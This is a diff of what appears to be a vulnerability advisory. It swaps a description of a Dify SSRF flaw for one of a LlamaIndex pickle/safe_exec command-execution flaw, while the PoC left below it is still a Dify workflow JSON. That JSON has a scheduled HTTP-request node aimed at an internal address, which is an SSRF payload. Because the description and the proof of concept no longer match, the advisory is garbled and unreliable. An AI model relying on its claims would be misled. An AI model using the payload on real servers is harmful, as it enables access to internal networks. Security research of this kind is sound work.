@@ -16,7 +16,7 @@
 
 ### 2.1Description
 
-The **tool component** in Dify's workflow is vulnerable to **Server-Side Request Forgery (SSRF)**. By constructing malicious URL parameters, attackers can force the server to send requests to internal networks or protected systems, thereby bypassing firewall restrictions to access internal services or perform sensitive operations.
+LlamaIndex is vulnerable to a command execution vulnerability caused by the combination of safe_exec and malicious pickle serialization. Attackers can bypass its security checks to construct malicious commands, leading to harms such as sensitive information leakage (e.g., reading sensitive data like system user accounts), system takeover (docker environments), lateral movement, and proliferation.
 
 ### 2.2Proof of Concept (PoC)
 
@@ -127,6 +127,7 @@ Connection: keep-alive
 
 {"graph":{"nodes":[{"id":"1763380884017","type":"custom","data":{"variables":[],"method":"get","url":"http://192.168.3.8:9992","authorization":{"type":"no-auth","config":null},"headers":"","params":"","body":{"type":"form-data","data":[{"id":"key-value-8883","type":"text","key":"","value":""}]},"ssl_verify":true,"timeout":{"max_connect_timeout":0,"max_read_timeout":0,"max_write_timeout":0},"retry_config":{"retry_enabled":true,"max_retries":3,"retry_interval":100},"type":"http-request","title":"HTTP 请求","selected":true},"position":{"x":426,"y":249},"targetPosition":"left","sourcePosition":"right","positionAbsolute":{"x":426,"y":249},"width":242,"height":121,"selected":true},{"id":"1763381398280","type":"custom","data":{"mode":"visual","frequency":"daily","visual_config":{"time":"12:00 AM","weekdays":["sun"],"on_minute":0,"monthly_days":[1]},"cron_expression":"","type":"trigger-schedule","title":"定时触发器","selected":true},"position":{"x":156,"y":228},"targetPosition":"left","sourcePosition":"right","positionAbsolute":{"x":156,"y":228},"width":242,"height":130,"selected":false}],"edges":[{"id":"1763381398280-source-1763380884017-target","type":"custom","source":"1763381398280","target":"1763380884017","sourceHandle":"source","targetHandle":"target","data":{"sourceType":"trigger-schedule","targetType":"http-request","isInLoop":false},"zIndex":0}],"viewport":{"x":0,"y":0,"zoom":1}},"features":{"opening_statement":"","suggested_questions":[],"suggested_questions_after_answer":{"enabled":false},"text_to_speech":{"enabled":false,"voice":"","language":""},"speech_to_text":{"enabled":false},"retriever_resource":{"enabled":true},"sensitive_word_avoidance":{"enabled":false},"file_upload":{"image":{"enabled":false,"number_limits":3,"transfer_methods":["local_file","remote_url"]},"enabled":false,"allowed_file_types":["image"],"allowed_file_extensions":[".JPG",".JPEG",".PNG",".GIF",".WEBP",".SVG"],"allowed_file_upload_methods":["local_file","remote_url"],"number_limits":3,"fileUploadConfig":{"file_size_limit":15,"batch_count_limit":5,"image_file_size_limit":10,"video_file_size_limit":100,"audio_file_size_limit":50,"workflow_file_upload_limit":10}}},"environment_variables":[],"conversation_variables":[],"hash":"02b27ccba55aa9160cca865791f601a5a60555e7ad36c02a0cd8aabc75d90dc6"}
 ```
+
 
 
 
